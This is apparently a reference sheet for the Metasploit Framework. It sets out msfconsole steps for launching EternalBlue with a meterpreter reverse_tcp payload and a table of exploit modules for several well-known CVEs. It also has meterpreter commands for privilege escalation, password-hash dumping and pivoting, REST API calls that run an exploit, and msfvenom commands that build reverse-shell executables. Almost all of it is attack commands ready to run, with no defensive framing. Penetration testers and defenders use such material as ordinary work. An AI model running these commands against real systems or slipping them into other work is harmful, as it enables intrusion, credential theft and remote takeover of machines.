# API Reference: Metasploit Framework

## msfconsole Commands

### Module Search
```
search type:exploit platform:windows cve:2021
search name:eternalblue
```

### Module Usage
```
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.1
set LHOST 10.10.10.5
set PAYLOAD windows/x64/meterpreter/reverse_tcp
check
exploit
```

### Resource Scripts
```bash
msfconsole -q -r exploit.rc
```

## Module Types

| Type | Path | Purpose |
|------|------|---------|
| exploit | exploit/ | Deliver payloads |
| auxiliary | auxiliary/ | Scanning, fuzzing |
| post | post/ | Post-exploitation |
| payload | payload/ | Shellcode/agents |
| encoder | encoder/ | Evasion encoding |

## Common Exploit Modules

| CVE | Module | Target |
|-----|--------|--------|
| CVE-2017-0144 | exploit/windows/smb/ms17_010_eternalblue | SMBv1 |
| CVE-2019-0708 | exploit/windows/rdp/cve_2019_0708_bluekeep_rce | RDP |
| CVE-2021-44228 | exploit/multi/http/log4shell_header_injection | Log4j |
| CVE-2020-1472 | exploit/windows/dcerpc/zerologon | Netlogon |
| CVE-2021-34527 | exploit/windows/dcerpc/cve_2021_1675_printnightmare | Print Spooler |

## Meterpreter Commands

### System
```
sysinfo          # System information
getuid           # Current user
getsystem        # Privilege escalation
hashdump         # Dump password hashes
```

### File System
```
upload /local/file /remote/path
download /remote/file /local/path
```

### Network
```
portfwd add -l 8080 -p 80 -r 10.10.10.2
route add 10.10.20.0 255.255.255.0 1
```

## Metasploit REST API

### Authentication
```http
POST https://msf:3790/api/v1/auth/account
Content-Type: application/json

{"username": "msf", "password": "password"}
```

### List Modules
```http
GET https://msf:3790/api/v1/modules/exploits
Authorization: Token {token}
```

### Run Module
```http
POST https://msf:3790/api/v1/modules/execute
Authorization: Token {token}

{
  "module_type": "exploit",
  "module_name": "exploit/windows/smb/ms17_010_eternalblue",
  "datastore": {"RHOSTS": "10.10.10.1"}
}
```

## msfvenom — Payload Generation
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f exe -o shell.exe
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f elf -o shell.elf
```
